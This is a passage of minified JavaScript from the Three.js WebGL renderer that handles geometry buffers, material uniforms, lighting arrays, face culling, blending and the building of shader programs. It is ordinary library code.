b2=aR(b6,b4,b7,b5,b3);D=-1;aP.setMaterialFaces(b5);if(b3.immediateRenderCallback){b3.immediateRenderCallback(b2,c,bu)}else{b3.render(function(b8){aP.renderBufferImmediate(b8,b2,b5)})}};function aT(b4){var b2=b4.object,b3=b2.material;if(b3.transparent){b4.transparent=b3;b4.opaque=null}else{b4.opaque=b3;b4.transparent=null}}function aq(b7){var b5=b7.object,b4=b7.buffer,b6,b3,b2;b2=b5.material;if(b2 instanceof THREE.MeshFaceMaterial){b3=b4.materialIndex;b6=b2.materials[b3];if(b6.transparent){b7.transparent=b6;b7.opaque=null}else{b7.opaque=b6;b7.transparent=null}}else{b6=b2;if(b6){if(b6.transparent){b7.transparent=b6;b7.opaque=null}else{b7.opaque=b6;b7.transparent=null}}}}function az(ca,b7){var b5,cc,b9,cd,b8,b3,b6={};var cb=ca.morphTargets.length;var b2=ca.morphNormals.length;var ce=b7 instanceof THREE.MeshFaceMaterial;ca.geometryGroups={};for(b5=0,cc=ca.faces.length;b5<cc;b5++){b9=ca.faces[b5];cd=ce?b9.materialIndex:0;if(b6[cd]===undefined){b6[cd]={hash:cd,counter:0}}b3=b6[cd].hash+"_"+b6[cd].counter;if(ca.geometryGroups[b3]===undefined){ca.geometryGroups[b3]={faces3:[],faces4:[],materialIndex:cd,vertices:0,numMorphTargets:cb,numMorphNormals:b2}}b8=b9 instanceof THREE.Face3?3:4;if(ca.geometryGroups[b3].vertices+b8>65535){b6[cd].counter+=1;b3=b6[cd].hash+"_"+b6[cd].counter;if(ca.geometryGroups[b3]===undefined){ca.geometryGroups[b3]={faces3:[],faces4:[],materialIndex:cd,vertices:0,numMorphTargets:cb,numMorphNormals:b2}}}if(b9 instanceof THREE.Face3){ca.geometryGroups[b3].faces3.push(b5)}else{ca.geometryGroups[b3].faces4.push(b5)}ca.geometryGroups[b3].vertices+=b8}ca.geometryGroupsList=[];for(var b4 in ca.geometryGroups){ca.geometryGroups[b4].id=U++;ca.geometryGroupsList.push(ca.geometryGroups[b4])}}this.initWebGLObjects=function(b4){if(!b4.__webglObjects){b4.__webglObjects=[];b4.__webglObjectsImmediate=[];b4.__webglSprites=[];b4.__webglFlares=[]}while(b4.__objectsAdded.length){au(b4.__objectsAdded[0],b4);b4.__objectsAdded.splice(0,1)}while(b4.__objectsRemoved.length){M(b4.__objectsRemoved[0],b4);b4.__objectsRemoved.splice(0,1)}for(var b5=0,b3=b4.__webglObjects.length;b5<b3;b5++){var b2=b4.__webglObjects[b5].object;if(b2.__webglInit===undefined){if(b2.__webglActive!==undefined){M(b2,b4)}au(b2,b4)}K(b2)}};function au(b3,b6){var b5,b7,b4,b2;if(b3.__webglInit===undefined){b3.__webglInit=true;b3._modelViewMatrix=new THREE.Matrix4();b3._normalMatrix=new THREE.Matrix3();if(b3.geometry!==undefined&&b3.geometry.__webglInit===undefined){b3.geometry.__webglInit=true;b3.geometry.addEventListener("dispose",a0)}b7=b3.geometry;if(b7===undefined){}else{if(b7 instanceof THREE.BufferGeometry){C(b7)}else{if(b3 instanceof THREE.Mesh){b4=b3.material;if(b7.geometryGroups===undefined){az(b7,b4)}for(b5 in b7.geometryGroups){b2=b7.geometryGroups[b5];if(!b2.__webglVertexBuffer){aF(b2);am(b2,b3);b7.verticesNeedUpdate=true;b7.morphTargetsNeedUpdate=true;b7.elementsNeedUpdate=true;b7.uvsNeedUpdate=true;b7.normalsNeedUpdate=true;b7.tangentsNeedUpdate=true;b7.colorsNeedUpdate=true}}}else{if(b3 instanceof THREE.Ribbon){if(!b7.__webglVertexBuffer){ae(b7);bV(b7,b3);b7.verticesNeedUpdate=true;b7.colorsNeedUpdate=true;b7.normalsNeedUpdate=true}}else{if(b3 instanceof THREE.Line){if(!b7.__webglVertexBuffer){af(b7);I(b7,b3);b7.verticesNeedUpdate=true;b7.colorsNeedUpdate=true;b7.lineDistancesNeedUpdate=true}}else{if(b3 instanceof THREE.ParticleSystem){if(!b7.__webglVertexBuffer){F(b7);bL(b7,b3);b7.verticesNeedUpdate=true;b7.colorsNeedUpdate=true}}}}}}}}if(b3.__webglActive===undefined){if(b3 instanceof THREE.Mesh){b7=b3.geometry;if(b7 instanceof THREE.BufferGeometry){G(b6.__webglObjects,b7,b3)}else{if(b7 instanceof THREE.Geometry){for(b5 in b7.geometryGroups){b2=b7.geometryGroups[b5];G(b6.__webglObjects,b2,b3)}}}}else{if(b3 instanceof THREE.Ribbon||b3 instanceof THREE.Line||b3 instanceof THREE.ParticleSystem){b7=b3.geometry;G(b6.__webglObjects,b7,b3)}else{if(b3 instanceof THREE.ImmediateRenderObject||b3.immediateRenderCallback){aE(b6.__webglObjectsImmediate,b3)}else{if(b3 instanceof THREE.Sprite){b6.__webglSprites.push(b3)}else{if(b3 instanceof THREE.LensFlare){b6.__webglFlares.push(b3)}}}}}b3.__webglActive=true}}function G(b4,b2,b3){b4.push({buffer:b2,object:b3,opaque:null,transparent:null})}function aE(b3,b2){b3.push({object:b2,opaque:null,transparent:null})}function K(b4){var b8=b4.geometry,b2,b6,b7;if(b8 instanceof THREE.BufferGeometry){ay(b8,c.DYNAMIC_DRAW,!b8.dynamic)}else{if(b4 instanceof THREE.Mesh){for(var b5=0,b3=b8.geometryGroupsList.length;b5<b3;b5++){b2=b8.geometryGroupsList[b5];b7=J(b4,b2);if(b8.buffersNeedUpdate){am(b2,b4)}b6=b7.attributes&&j(b7);if(b8.verticesNeedUpdate||b8.morphTargetsNeedUpdate||b8.elementsNeedUpdate||b8.uvsNeedUpdate||b8.normalsNeedUpdate||b8.colorsNeedUpdate||b8.tangentsNeedUpdate||b6){q(b2,b4,c.DYNAMIC_DRAW,!b8.dynamic,b7)}}b8.verticesNeedUpdate=false;b8.morphTargetsNeedUpdate=false;b8.elementsNeedUpdate=false;b8.uvsNeedUpdate=false;b8.normalsNeedUpdate=false;b8.colorsNeedUpdate=false;b8.tangentsNeedUpdate=false;b8.buffersNeedUpdate=false;b7.attributes&&aw(b7)}else{if(b4 instanceof THREE.Ribbon){b7=J(b4,b8);b6=b7.attributes&&j(b7);if(b8.verticesNeedUpdate||b8.colorsNeedUpdate||b8.normalsNeedUpdate||b6){T(b8,c.DYNAMIC_DRAW)}b8.verticesNeedUpdate=false;b8.colorsNeedUpdate=false;b8.normalsNeedUpdate=false;b7.attributes&&aw(b7)}else{if(b4 instanceof THREE.Line){b7=J(b4,b8);b6=b7.attributes&&j(b7);if(b8.verticesNeedUpdate||b8.colorsNeedUpdate||b8.lineDistancesNeedUpdate||b6){bp(b8,c.DYNAMIC_DRAW)}b8.verticesNeedUpdate=false;b8.colorsNeedUpdate=false;b8.lineDistancesNeedUpdate=false;b7.attributes&&aw(b7)}else{if(b4 instanceof THREE.ParticleSystem){b7=J(b4,b8);b6=b7.attributes&&j(b7);if(b8.verticesNeedUpdate||b8.colorsNeedUpdate||b4.sortParticles||b6){a8(b8,c.DYNAMIC_DRAW,b4)}b8.verticesNeedUpdate=false;b8.colorsNeedUpdate=false;b7.attributes&&aw(b7)}}}}}}function j(b3){for(var b2 in b3.attributes){if(b3.attributes[b2].needsUpdate){return true}}return false}function aw(b3){for(var b2 in b3.attributes){b3.attributes[b2].needsUpdate=false}}function M(b2,b3){if(b2 instanceof THREE.Mesh||b2 instanceof THREE.ParticleSystem||b2 instanceof THREE.Ribbon||b2 instanceof THREE.Line){bZ(b3.__webglObjects,b2)}else{if(b2 instanceof THREE.Sprite){aB(b3.__webglSprites,b2)}else{if(b2 instanceof THREE.LensFlare){aB(b3.__webglFlares,b2)}else{if(b2 instanceof THREE.ImmediateRenderObject||b2.immediateRenderCallback){bZ(b3.__webglObjectsImmediate,b2)}}}}delete b2.__webglActive}function bZ(b3,b2){for(var b4=b3.length-1;b4>=0;b4--){if(b3[b4].object===b2){b3.splice(b4,1)}}}function aB(b3,b2){for(var b4=b3.length-1;b4>=0;b4--){if(b3[b4]===b2){b3.splice(b4,1)}}}this.initMaterial=function(cc,ca,b3,b8){cc.addEventListener("dispose",bj);var ch,ce,cd,cb,cg,b6,b2,b7,cf;if(cc instanceof THREE.MeshDepthMaterial){cf="depth"}else{if(cc instanceof THREE.MeshNormalMaterial){cf="normal"}else{if(cc instanceof THREE.MeshBasicMaterial){cf="basic"}else{if(cc instanceof THREE.MeshLambertMaterial){cf="lambert"}else{if(cc instanceof THREE.MeshPhongMaterial){cf="phong"}else{if(cc instanceof THREE.LineBasicMaterial){cf="basic"}else{if(cc instanceof THREE.LineDashedMaterial){cf="dashed"}else{if(cc instanceof THREE.ParticleBasicMaterial){cf="particle_basic"}}}}}}}}if(cf){ar(cc,THREE.ShaderLib[cf])}b6=bh(ca);b7=Z(ca);b2=aK(b8);cg={map:!!cc.map,envMap:!!cc.envMap,lightMap:!!cc.lightMap,bumpMap:!!cc.bumpMap,normalMap:!!cc.normalMap,specularMap:!!cc.specularMap,vertexColors:cc.vertexColors,fog:b3,useFog:cc.fog,fogExp:b3 instanceof THREE.FogExp2,sizeAttenuation:cc.sizeAttenuation,skinning:cc.skinning,maxBones:b2,useVertexTexture:Y&&b8&&b8.useVertexTexture,boneTextureWidth:b8&&b8.boneTextureWidth,boneTextureHeight:b8&&b8.boneTextureHeight,morphTargets:cc.morphTargets,morphNormals:cc.morphNormals,maxMorphTargets:this.maxMorphTargets,maxMorphNormals:this.maxMorphNormals,maxDirLights:b6.directional,maxPointLights:b6.point,maxSpotLights:b6.spot,maxHemiLights:b6.hemi,maxShadows:b7,shadowMapEnabled:this.shadowMapEnabled&&b8.receiveShadow,shadowMapType:this.shadowMapType,shadowMapDebug:this.shadowMapDebug,shadowMapCascade:this.shadowMapCascade,alphaTest:cc.alphaTest,metal:cc.metal,perPixel:cc.perPixel,wrapAround:cc.wrapAround,doubleSided:cc.side===THREE.DoubleSide,flipSided:cc.side===THREE.BackSide};cc.program=h(cf,cc.fragmentShader,cc.vertexShader,cc.uniforms,cc.attributes,cc.defines,cg);var b9=cc.program.attributes;if(cc.morphTargets){cc.numSupportedMorphTargets=0;var b5,b4="morphTarget";for(cb=0;cb<this.maxMorphTargets;cb++){b5=b4+cb;if(b9[b5]>=0){cc.numSupportedMorphTargets++}}}if(cc.morphNormals){cc.numSupportedMorphNormals=0;var b5,b4="morphNormal";for(cb=0;cb<this.maxMorphNormals;cb++){b5=b4+cb;if(b9[b5]>=0){cc.numSupportedMorphNormals++}}}cc.uniformsList=[];for(ch in cc.uniforms){cc.uniformsList.push([cc.uniforms[ch],ch])}};function ar(b3,b2){b3.uniforms=THREE.UniformsUtils.clone(b2.uniforms);b3.vertexShader=b2.vertexShader;b3.fragmentShader=b2.fragmentShader}function aR(b7,b4,b2,b8,b3){bg=0;if(b8.needsUpdate){if(b8.program){Q(b8)}aP.initMaterial(b8,b4,b2,b3);b8.needsUpdate=false}if(b8.morphTargets){if(!b3.__webglMorphTargetInfluences){b3.__webglMorphTargetInfluences=new Float32Array(aP.maxMorphTargets)}}var b6=false;var b5=b8.program,cb=b5.uniforms,b9=b8.uniforms;if(b5!==an){c.useProgram(b5);an=b5;b6=true}if(b8.id!==a3){a3=b8.id;b6=true}if(b6||b7!==aM){c.uniformMatrix4fv(cb.projectionMatrix,false,b7.projectionMatrix.elements);if(b7!==aM){aM=b7}}if(b8.skinning){if(Y&&b3.useVertexTexture){if(cb.boneTexture!==null){var ca=ax();c.uniform1i(cb.boneTexture,ca);aP.setTexture(b3.boneTexture,ca)}}else{if(cb.boneGlobalMatrices!==null){c.uniformMatrix4fv(cb.boneGlobalMatrices,false,b3.boneMatrices)}}}if(b6){if(b2&&b8.fog){aa(b9,b2)}if(b8 instanceof THREE.MeshPhongMaterial||b8 instanceof THREE.MeshLambertMaterial||b8.lights){if(b1){g(b5,b4);b1=false}bd(b9,br)}if(b8 instanceof THREE.MeshBasicMaterial||b8 instanceof THREE.MeshLambertMaterial||b8 instanceof THREE.MeshPhongMaterial){bI(b9,b8)}if(b8 instanceof THREE.LineBasicMaterial){at(b9,b8)}else{if(b8 instanceof THREE.LineDashedMaterial){at(b9,b8);ah(b9,b8)}else{if(b8 instanceof THREE.ParticleBasicMaterial){bq(b9,b8)}else{if(b8 instanceof THREE.MeshPhongMaterial){N(b9,b8)}else{if(b8 instanceof THREE.MeshLambertMaterial){bJ(b9,b8)}else{if(b8 instanceof THREE.MeshDepthMaterial){b9.mNear.value=b7.near;b9.mFar.value=b7.far;b9.opacity.value=b8.opacity}else{if(b8 instanceof THREE.MeshNormalMaterial){b9.opacity.value=b8.opacity}}}}}}}if(b3.receiveShadow&&!b8._shadowPass){bQ(b9,b4)}S(b5,b8.uniformsList);if(b8 instanceof THREE.ShaderMaterial||b8 instanceof THREE.MeshPhongMaterial||b8.envMap){if(cb.cameraPosition!==null){V.getPositionFromMatrix(b7.matrixWorld);c.uniform3f(cb.cameraPosition,V.x,V.y,V.z)}}if(b8 instanceof THREE.MeshPhongMaterial||b8 instanceof THREE.MeshLambertMaterial||b8 instanceof THREE.ShaderMaterial||b8.skinning){if(cb.viewMatrix!==null){c.uniformMatrix4fv(cb.viewMatrix,false,b7.matrixWorldInverse.elements)}}}x(cb,b3);if(cb.modelMatrix!==null){c.uniformMatrix4fv(cb.modelMatrix,false,b3.matrixWorld.elements)}return b5}function bI(b3,b4){b3.opacity.value=b4.opacity;if(aP.gammaInput){b3.diffuse.value.copyGammaToLinear(b4.color)}else{b3.diffuse.value=b4.color}b3.map.value=b4.map;b3.lightMap.value=b4.lightMap;b3.specularMap.value=b4.specularMap;if(b4.bumpMap){b3.bumpMap.value=b4.bumpMap;b3.bumpScale.value=b4.bumpScale}if(b4.normalMap){b3.normalMap.value=b4.normalMap;b3.normalScale.value.copy(b4.normalScale)}var b2;if(b4.map){b2=b4.map}else{if(b4.specularMap){b2=b4.specularMap}else{if(b4.normalMap){b2=b4.normalMap}else{if(b4.bumpMap){b2=b4.bumpMap}}}}if(b2!==undefined){var b6=b2.offset;var b5=b2.repeat;b3.offsetRepeat.value.set(b6.x,b6.y,b5.x,b5.y)}b3.envMap.value=b4.envMap;b3.flipEnvMap.value=(b4.envMap instanceof THREE.WebGLRenderTargetCube)?1:-1;if(aP.gammaInput){b3.reflectivity.value=b4.reflectivity}else{b3.reflectivity.value=b4.reflectivity}b3.refractionRatio.value=b4.refractionRatio;b3.combine.value=b4.combine;b3.useRefract.value=b4.envMap&&b4.envMap.mapping instanceof THREE.CubeRefractionMapping}function at(b2,b3){b2.diffuse.value=b3.color;b2.opacity.value=b3.opacity}function ah(b2,b3){b2.dashSize.value=b3.dashSize;b2.totalSize.value=b3.dashSize+b3.gapSize;b2.scale.value=b3.scale}function bq(b2,b3){b2.psColor.value=b3.color;b2.opacity.value=b3.opacity;b2.size.value=b3.size;b2.scale.value=aZ.height/2;b2.map.value=b3.map}function aa(b2,b3){b2.fogColor.value=b3.color;if(b3 instanceof THREE.Fog){b2.fogNear.value=b3.near;b2.fogFar.value=b3.far}else{if(b3 instanceof THREE.FogExp2){b2.fogDensity.value=b3.density}}}function N(b2,b3){b2.shininess.value=b3.shininess;if(aP.gammaInput){b2.ambient.value.copyGammaToLinear(b3.ambient);b2.emissive.value.copyGammaToLinear(b3.emissive);b2.specular.value.copyGammaToLinear(b3.specular)}else{b2.ambient.value=b3.ambient;b2.emissive.value=b3.emissive;b2.specular.value=b3.specular}if(b3.wrapAround){b2.wrapRGB.value.copy(b3.wrapRGB)}}function bJ(b2,b3){if(aP.gammaInput){b2.ambient.value.copyGammaToLinear(b3.ambient);b2.emissive.value.copyGammaToLinear(b3.emissive)}else{b2.ambient.value=b3.ambient;b2.emissive.value=b3.emissive}if(b3.wrapAround){b2.wrapRGB.value.copy(b3.wrapRGB)}}function bd(b2,b3){b2.ambientLightColor.value=b3.ambient;b2.directionalLightColor.value=b3.directional.colors;b2.directionalLightDirection.value=b3.directional.positions;b2.pointLightColor.value=b3.point.colors;b2.pointLightPosition.value=b3.point.positions;b2.pointLightDistance.value=b3.point.distances;b2.spotLightColor.value=b3.spot.colors;b2.spotLightPosition.value=b3.spot.positions;b2.spotLightDistance.value=b3.spot.distances;b2.spotLightDirection.value=b3.spot.directions;b2.spotLightAngleCos.value=b3.spot.anglesCos;b2.spotLightExponent.value=b3.spot.exponents;b2.hemisphereLightSkyColor.value=b3.hemi.skyColors;b2.hemisphereLightGroundColor.value=b3.hemi.groundColors;b2.hemisphereLightDirection.value=b3.hemi.positions}function bQ(b2,b6){if(b2.shadowMatrix){var b5=0;for(var b7=0,b4=b6.length;b7<b4;b7++){var b3=b6[b7];if(!b3.castShadow){continue}if(b3 instanceof THREE.SpotLight||(b3 instanceof THREE.DirectionalLight&&!b3.shadowCascade)){b2.shadowMap.value[b5]=b3.shadowMap;b2.shadowMapSize.value[b5]=b3.shadowMapSize;b2.shadowMatrix.value[b5]=b3.shadowMatrix;b2.shadowDarkness.value[b5]=b3.shadowDarkness;b2.shadowBias.value[b5]=b3.shadowBias;b5++}}}}function x(b2,b3){c.uniformMatrix4fv(b2.modelViewMatrix,false,b3._modelViewMatrix.elements);if(b2.normalMatrix){c.uniformMatrix3fv(b2.normalMatrix,false,b3._normalMatrix.elements)}}function ax(){var b2=bg;if(b2>=bK){console.warn("WebGLRenderer: trying to use "+b2+" texture units while this GPU supports only "+bK)}bg+=1;return b2}function S(b7,cd){var b2,cb,b9,cc,b8,ce,b6,ca,b4,b5,b3;for(b4=0,b5=cd.length;b4<b5;b4++){cc=b7.uniforms[cd[b4][1]];if(!cc){continue}b2=cd[b4][0];b9=b2.type;cb=b2.value;if(b9==="i"){c.uniform1i(cc,cb)}else{if(b9==="f"){c.uniform1f(cc,cb)}else{if(b9==="v2"){c.uniform2f(cc,cb.x,cb.y)}else{if(b9==="v3"){c.uniform3f(cc,cb.x,cb.y,cb.z)}else{if(b9==="v4"){c.uniform4f(cc,cb.x,cb.y,cb.z,cb.w)}else{if(b9==="c"){c.uniform3f(cc,cb.r,cb.g,cb.b)}else{if(b9==="iv1"){c.uniform1iv(cc,cb)}else{if(b9==="iv"){c.uniform3iv(cc,cb)}else{if(b9==="fv1"){c.uniform1fv(cc,cb)}else{if(b9==="fv"){c.uniform3fv(cc,cb)}else{if(b9==="v2v"){if(b2._array===undefined){b2._array=new Float32Array(2*cb.length)}for(b6=0,ca=cb.length;b6<ca;b6++){b3=b6*2;b2._array[b3]=cb[b6].x;b2._array[b3+1]=cb[b6].y}c.uniform2fv(cc,b2._array)}else{if(b9==="v3v"){if(b2._array===undefined){b2._array=new Float32Array(3*cb.length)}for(b6=0,ca=cb.length;b6<ca;b6++){b3=b6*3;b2._array[b3]=cb[b6].x;b2._array[b3+1]=cb[b6].y;b2._array[b3+2]=cb[b6].z}c.uniform3fv(cc,b2._array)}else{if(b9==="v4v"){if(b2._array===undefined){b2._array=new Float32Array(4*cb.length)}for(b6=0,ca=cb.length;b6<ca;b6++){b3=b6*4;b2._array[b3]=cb[b6].x;b2._array[b3+1]=cb[b6].y;b2._array[b3+2]=cb[b6].z;b2._array[b3+3]=cb[b6].w}c.uniform4fv(cc,b2._array)}else{if(b9==="m4"){if(b2._array===undefined){b2._array=new Float32Array(16)}cb.flattenToArray(b2._array);c.uniformMatrix4fv(cc,false,b2._array)}else{if(b9==="m4v"){if(b2._array===undefined){b2._array=new Float32Array(16*cb.length)}for(b6=0,ca=cb.length;b6<ca;b6++){cb[b6].flattenToArrayOffset(b2._array,b6*16)}c.uniformMatrix4fv(cc,false,b2._array)}else{if(b9==="t"){b8=cb;ce=ax();c.uniform1i(cc,ce);if(!b8){continue}if(b8.image instanceof Array&&b8.image.length===6){bn(b8,ce)}else{if(b8 instanceof THREE.WebGLRenderTargetCube){bb(b8,ce)}else{aP.setTexture(b8,ce)}}}else{if(b9==="tv"){if(b2._array===undefined){b2._array=[]}for(b6=0,ca=b2.value.length;b6<ca;b6++){b2._array[b6]=ax()}c.uniform1iv(cc,b2._array);for(b6=0,ca=b2.value.length;b6<ca;b6++){b8=b2.value[b6];ce=b2._array[b6];if(!b8){continue}aP.setTexture(b8,ce)}}}}}}}}}}}}}}}}}}}}function bi(b2,b3){b2._modelViewMatrix.multiplyMatrices(b3.matrixWorldInverse,b2.matrixWorld);b2._normalMatrix.getNormalMatrix(b2._modelViewMatrix)}function a6(b5,b4,b2,b3){b5[b4]=b2.r*b2.r*b3;b5[b4+1]=b2.g*b2.g*b3;b5[b4+2]=b2.b*b2.b*b3}function a7(b5,b4,b3,b2){b5[b4]=b3.r*b2;b5[b4+1]=b3.g*b2;b5[b4+2]=b3.b*b2}function g(b2,b7){var cF,ct,ck,cB,cw=0,cG=0,cH=0,cr,b4,cb,cs,ca,cv,ci,co=br,cg=co.directional.colors,b5=co.directional.positions,cC=co.point.colors,cy=co.point.positions,cq=co.point.distances,cD=co.spot.colors,b6=co.spot.positions,cz=co.spot.distances,cf=co.spot.directions,b8=co.spot.anglesCos,ch=co.spot.exponents,b3=co.hemi.skyColors,cE=co.hemi.groundColors,ce=co.hemi.positions,cI=0,cn=0,cj=0,cc=0,cp=0,cm=0,cl=0,b9=0,cd=0,cA=0,cx=0,cu=0;for(cF=0,ct=b7.length;cF<ct;cF++){ck=b7[cF];if(ck.onlyShadow){continue}cr=ck.color;cs=ck.intensity;ci=ck.distance;if(ck instanceof THREE.AmbientLight){if(!ck.visible){continue}if(aP.gammaInput){cw+=cr.r*cr.r;cG+=cr.g*cr.g;cH+=cr.b*cr.b}else{cw+=cr.r;cG+=cr.g;cH+=cr.b}}else{if(ck instanceof THREE.DirectionalLight){cp+=1;if(!ck.visible){continue}aN.getPositionFromMatrix(ck.matrixWorld);V.getPositionFromMatrix(ck.target.matrixWorld);aN.sub(V);aN.normalize();if(aN.x===0&&aN.y===0&&aN.z===0){continue}cd=cI*3;b5[cd]=aN.x;b5[cd+1]=aN.y;b5[cd+2]=aN.z;if(aP.gammaInput){a6(cg,cd,cr,cs*cs)}else{a7(cg,cd,cr,cs)}cI+=1}else{if(ck instanceof THREE.PointLight){cm+=1;if(!ck.visible){continue}cA=cn*3;if(aP.gammaInput){a6(cC,cA,cr,cs*cs)}else{a7(cC,cA,cr,cs)}V.getPositionFromMatrix(ck.matrixWorld);cy[cA]=V.x;cy[cA+1]=V.y;cy[cA+2]=V.z;cq[cn]=ci;cn+=1}else{if(ck instanceof THREE.SpotLight){cl+=1;if(!ck.visible){continue}cx=cj*3;if(aP.gammaInput){a6(cD,cx,cr,cs*cs)}else{a7(cD,cx,cr,cs)}V.getPositionFromMatrix(ck.matrixWorld);b6[cx]=V.x;b6[cx+1]=V.y;b6[cx+2]=V.z;cz[cj]=ci;aN.copy(V);V.getPositionFromMatrix(ck.target.matrixWorld);aN.sub(V);aN.normalize();cf[cx]=aN.x;cf[cx+1]=aN.y;cf[cx+2]=aN.z;b8[cj]=Math.cos(ck.angle);ch[cj]=ck.exponent;cj+=1}else{if(ck instanceof THREE.HemisphereLight){b9+=1;if(!ck.visible){continue}aN.getPositionFromMatrix(ck.matrixWorld);aN.normalize();if(aN.x===0&&aN.y===0&&aN.z===0){continue}cu=cc*3;ce[cu]=aN.x;ce[cu+1]=aN.y;ce[cu+2]=aN.z;b4=ck.color;cb=ck.groundColor;if(aP.gammaInput){ca=cs*cs;a6(b3,cu,b4,ca);a6(cE,cu,cb,ca)}else{a7(b3,cu,b4,cs);a7(cE,cu,cb,cs)}cc+=1}}}}}}for(cF=cI*3,ct=Math.max(cg.length,cp*3);cF<ct;cF++){cg[cF]=0}for(cF=cn*3,ct=Math.max(cC.length,cm*3);cF<ct;cF++){cC[cF]=0}for(cF=cj*3,ct=Math.max(cD.length,cl*3);cF<ct;cF++){cD[cF]=0}for(cF=cc*3,ct=Math.max(b3.length,b9*3);cF<ct;cF++){b3[cF]=0}for(cF=cc*3,ct=Math.max(cE.length,b9*3);cF<ct;cF++){cE[cF]=0}co.directional.length=cI;co.point.length=cn;co.spot.length=cj;co.hemi.length=cc;co.ambient[0]=cw;co.ambient[1]=cG;co.ambient[2]=cH}this.setFaceCulling=function(b3,b2){if(b3===THREE.CullFaceNone){c.disable(c.CULL_FACE)}else{if(b2===THREE.FrontFaceDirectionCW){c.frontFace(c.CW)}else{c.frontFace(c.CCW)}if(b3===THREE.CullFaceBack){c.cullFace(c.BACK)}else{if(b3===THREE.CullFaceFront){c.cullFace(c.FRONT)}else{c.cullFace(c.FRONT_AND_BACK)}}c.enable(c.CULL_FACE)}};this.setMaterialFaces=function(b4){var b2=b4.side===THREE.DoubleSide;var b3=b4.side===THREE.BackSide;if(bm!==b2){if(b2){c.disable(c.CULL_FACE)}else{c.enable(c.CULL_FACE)}bm=b2}if(m!==b3){if(b3){c.frontFace(c.CW)}else{c.frontFace(c.CCW)}m=b3}};this.setDepthTest=function(b2){if(a!==b2){if(b2){c.enable(c.DEPTH_TEST)}else{c.disable(c.DEPTH_TEST)}a=b2}};this.setDepthWrite=function(b2){if(bA!==b2){c.depthMask(b2);bA=b2}};function aJ(b2){if(b2!==bo){c.lineWidth(b2);bo=b2}}function bY(b4,b3,b2){if(aL!==b4){if(b4){c.enable(c.POLYGON_OFFSET_FILL)}else{c.disable(c.POLYGON_OFFSET_FILL)}aL=b4}if(b4&&(bP!==b3||bc!==b2)){c.polygonOffset(b3,b2);bP=b3;bc=b2}}this.setBlending=function(b3,b2,b4,b5){if(b3!==k){if(b3===THREE.NoBlending){c.disable(c.BLEND)}else{if(b3===THREE.AdditiveBlending){c.enable(c.BLEND);c.blendEquation(c.FUNC_ADD);c.blendFunc(c.SRC_ALPHA,c.ONE)}else{if(b3===THREE.SubtractiveBlending){c.enable(c.BLEND);c.blendEquation(c.FUNC_ADD);c.blendFunc(c.ZERO,c.ONE_MINUS_SRC_COLOR)}else{if(b3===THREE.MultiplyBlending){c.enable(c.BLEND);c.blendEquation(c.FUNC_ADD);c.blendFunc(c.ZERO,c.SRC_COLOR)}else{if(b3===THREE.CustomBlending){c.enable(c.BLEND)}else{c.enable(c.BLEND);c.blendEquationSeparate(c.FUNC_ADD,c.FUNC_ADD);c.blendFuncSeparate(c.SRC_ALPHA,c.ONE_MINUS_SRC_ALPHA,c.ONE,c.ONE_MINUS_SRC_ALPHA)}}}}}k=b3}if(b3===THREE.CustomBlending){if(b2!==ak){c.blendEquation(aU(b2));ak=b2}if(b4!==bR||b5!==av){c.blendFunc(aU(b4),aU(b5));bR=b4;av=b5}}else{ak=null;bR=null;av=null}};function P(b3){var b4,b2,b6=[];for(var b5 in b3){b4=b3[b5];if(b4===false){continue}b2="#define "+b5+" "+b4;b6.push(b2)}return b6.join("\n")}function h(cb,b2,b7,co,cf,cl,cd){var ci,cm,cn,ce,b3;var ch=[];if(cb){ch.push(cb)}else{ch.push(b2);ch.push(b7)}for(cn in cl){ch.push(cn);ch.push(cl[cn])}for(ci in cd){ch.push(ci);ch.push(cd[ci])}b3=ch.join();for(ci=0,cm=bF.length;ci<cm;ci++){var ca=bF[ci];if(ca.code===b3){ca.usedTimes++;return ca.program}}var b4="SHADOWMAP_TYPE_BASIC";if(cd.shadowMapType===THREE.PCFShadowMap){b4="SHADOWMAP_TYPE_PCF"}else{if(cd.shadowMapType===THREE.PCFSoftShadowMap){b4="SHADOWMAP_TYPE_PCF_SOFT"}}var b6=P(cl);ce=c.createProgram();var b5=["precision "+l+" float;",b6,aX?"#define VERTEX_TEXTURES":"",aP.gammaInput?"#define GAMMA_INPUT":"",aP.gammaOutput?"#define GAMMA_OUTPUT":"",aP.physicallyBasedShading?"#define PHYSICALLY_BASED_SHADING":"","#define MAX_DIR_LIGHTS "+cd.maxDirLights,"#define MAX_POINT_LIGHTS "+cd.maxPointLights,"#define MAX_SPOT_LIGHTS "+cd.maxSpotLights,"#define MAX_HEMI_LIGHTS "+cd.maxHemiLights,"#define MAX_SHADOWS "+cd.maxShadows,"#define MAX_BONES "+cd.maxBones,cd.map?"#define USE_MAP":"",cd.envMap?"#define USE_ENVMAP":"",cd.lightMap?"#define USE_LIGHTMAP":"",cd.bumpMap?"#define USE_BUMPMAP":"",cd.normalMap?"#define USE_NORMALMAP":"",cd.specularMap?"#define USE_SPECULARMAP":"",cd.vertexColors?"#define USE_COLOR":"",cd.skinning?"#define USE_SKINNING":"",cd.useVertexTexture?"#define BONE_TEXTURE":"",cd.boneTextureWidth?"#define N_BONE_PIXEL_X "+cd.boneTextureWidth.toFixed(1):"",cd.boneTextureHeight?"#define N_BONE_PIXEL_Y "+cd.boneTextureHeight.toFixed(1):"",cd.morphTargets?"#define USE_MORPHTARGETS":"",cd.morphNormals?"#define USE_MORPHNORMALS":"",cd.perPixel?"#define PHONG_PER_PIXEL":"",cd.wrapAround?"#define WRAP_AROUND":"",cd.doubleSided?"#define DOUBLE_SIDED":"",cd.flipSided?"#define FLIP_SIDED":"",cd.shadowMapEnabled?"#define USE_SHADOWMAP":"",cd.shadowMapEnabled?"#define "+b4:"",cd.shadowMapDebug?"#define SHADOWMAP_DEBUG":"",cd.shadowMapCascade?"#define SHADOWMAP_CASCADE":"",cd.sizeAttenuation?"#define USE_SIZEATTENUATION":"","uniform mat4 modelMatrix;","uniform mat4 modelViewMatrix;","uniform mat4 projectionMatrix;","uniform mat4 viewMatrix;","uniform mat3 normalMatrix;","uniform vec3 cameraPosition;","attribute vec3 position;","attribute vec3 normal;","attribute vec2 uv;","attribute vec2 uv2;","#ifdef USE_COLOR","attribute vec3 color;","#endif","#ifdef USE_MORPHTARGETS","attribute vec3 morphTarget0;","attribute vec3 morphTarget1;","attribute vec3 morphTarget2;","attribute vec3 morphTarget3;","#ifdef USE_MORPHNORMALS","attribute vec3 morphNormal0;","attribute vec3 morphNormal1;","attribute vec3 morphNormal2;","attribute vec3 morphNormal3;","#else","attribute vec3 morphTarget4;","attribute vec3 